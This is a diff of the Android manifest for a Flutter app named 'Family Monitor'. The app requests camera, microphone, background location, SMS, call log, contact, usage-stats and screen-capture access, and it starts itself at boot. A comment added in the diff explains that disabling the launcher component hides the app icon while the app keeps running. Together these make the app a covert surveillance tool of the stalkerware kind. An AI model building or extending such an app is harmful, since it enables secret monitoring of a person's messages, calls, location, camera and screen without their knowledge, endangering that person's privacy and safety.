@@ -1,33 +1,52 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- ── Core network + location ───────────────────────────────────────── -->
     <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.CAMERA"/>
-    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+
+    <!-- ── Camera + mic ──────────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+
+    <!-- ── Foreground services ───────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+    <!-- Required on Android 14+ for MediaProjection foreground service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+
+    <!-- ── Boot + wake ───────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+
+    <!-- ── Content reading ───────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
-    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions"/>
+
+    <!-- ── Notifications ─────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+
+    <!-- ── Hardware features (optional) ─────────────────────────────────── -->
+    <uses-feature android:name="android.hardware.camera"       android:required="false"/>
     <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+
     <application
         android:label="Family Monitor"
         android:name="${applicationName}"
         android:icon="@mipmap/ic_launcher"
         android:usesCleartextTraffic="true">
+
+        <!-- ── Main activity ────────────────────────────────────────────── -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -38,29 +57,53 @@
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize"
             android:showOnLockScreen="true">
-            <meta-data android:name="io.flutter.embedding.android.NormalTheme" android:resource="@style/NormalTheme"/>
+            <meta-data android:name="io.flutter.embedding.android.NormalTheme"
+                android:resource="@style/NormalTheme"/>
+            <!-- This is the REAL launcher intent-filter; disabling this
+                 component (via packageManager.setComponentEnabledSetting)
+                 hides the launcher icon while the app keeps running. -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-        <service android:name="com.pravera.flutter_foreground_task.service.ForegroundService"
-            android:foregroundServiceType="camera|microphone|location" android:exported="false"/>
-        <service android:name="id.flutter.flutter_background_service.BackgroundService"
-            tools:replace="android:exported" android:exported="true"
+
+        <!-- ── flutter_foreground_task service ──────────────────────────── -->
+        <service
+            android:name="com.pravera.flutter_foreground_task.service.ForegroundService"
+            android:foregroundServiceType="camera|microphone|location"
+            android:exported="false"/>
+
+        <!-- ── flutter_background_service ───────────────────────────────── -->
+        <service
+            android:name="id.flutter.flutter_background_service.BackgroundService"
+            tools:replace="android:exported"
+            android:exported="true"
             android:foregroundServiceType="camera|microphone"/>
-        <service android:name=".ScreenCaptureService"
+
+        <!-- ── ScreenCaptureService: holds MediaProjection token alive ───── -->
+        <!-- android:foregroundServiceType="mediaProjection" is required
+             on Android 10+ for MediaProjection. -->
+        <service
+            android:name=".ScreenCaptureService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection"/>
+
+        <!-- ── Boot receiver ─────────────────────────────────────────────── -->
         <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
                 <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
             </intent-filter>
         </receiver>
+
         <meta-data android:name="flutterEmbedding" android:value="2"/>
     </application>
+
     <queries>
-        <intent><action android:name="android.intent.action.PROCESS_TEXT"/><data android:mimeType="text/plain"/></intent>
+        <intent>
+            <action android:name="android.intent.action.PROCESS_TEXT"/>
+            <data android:mimeType="text/plain"/>
+        </intent>
     </queries>
 </manifest>
